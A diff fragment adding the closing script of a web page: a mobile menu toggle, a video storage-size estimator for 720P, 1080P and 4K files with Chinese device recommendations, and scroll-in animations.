+burger.addEventListener('click',function(){
+  nav.classList.toggle('open');
+  var o=nav.classList.contains('open');
+  burger.setAttribute('aria-expanded',o);burger.innerHTML=o?'&#10005;':'&#9776;';
+});
+nav.querySelectorAll('a').forEach(function(a){a.addEventListener('click',function(){
+  nav.classList.remove('open');burger.setAttribute('aria-expanded','false');burger.innerHTML='&#9776;';
+})});
+/* capacity estimator */
+function est(){
+  var m=parseFloat(document.getElementById('mins').value)||0;
+  var e=parseInt(document.getElementById('eps').value,10)||1;
+  var r=parseFloat(document.querySelector('input[name="res"]:checked').value);
+  var a=m*0.7*e,b=m*1.2*e,c=m*3.5*e,sel=m*r*e;
+  var mx=Math.max(c,1);
+  document.getElementById('o720').textContent=mk(a);
+  document.getElementById('o1080').textContent=mk(b);
+  document.getElementById('o4k').textContent=mk(c);
+  document.getElementById('f720').style.width=(a/mx*100)+'%';
+  document.getElementById('f1080').style.width=(b/mx*100)+'%';
+  document.getElementById('f4k').style.width=(c/mx*100)+'%';
+  var fmt=r<0.9?'720P · MP4':r<2?'1080P · MKV':'4K · MP4';
+  var dev=r<0.9?'手机 / 平板 / 移动硬盘':r<2?'平板 / 笔记本 / 电视盒子':'大屏电视 / 高配电脑 / 大容量硬盘';
+  document.getElementById('outFmt').textContent=fmt;
+  document.getElementById('outSize').textContent=mk(sel);
+  document.getElementById('outPad').textContent=mk(sel*1.2);
+  document.getElementById('outDev').textContent=dev;
+}
+function mk(v){return v>=10?Math.round(v)+' GB':(Math.round(v*10)/10)+' GB';}
+document.getElementById('calc').addEventListener('click',est);
+document.getElementById('search').addEventListener('submit',function(){return false});
+var io=new IntersectionObserver(function(es){
+  es.forEach(function(e){
+    if(e.isIntersecting){e.target.style.opacity=1;e.target.style.transform='translateY(0)';io.unobserve(e.target);}
+  });
+},{threshold:.12});
+document.querySelectorAll('.step,.queue,.gbar,.out,.q,.spec,.wrap-tbl').forEach(function(el){
+  el.style.opacity=0;el.style.transform='translateY(24px)';el.style.transition='opacity .5s ease,transform .5s ease';io.observe(el);
+});
+est();
+</script>
+</body>
+</html>
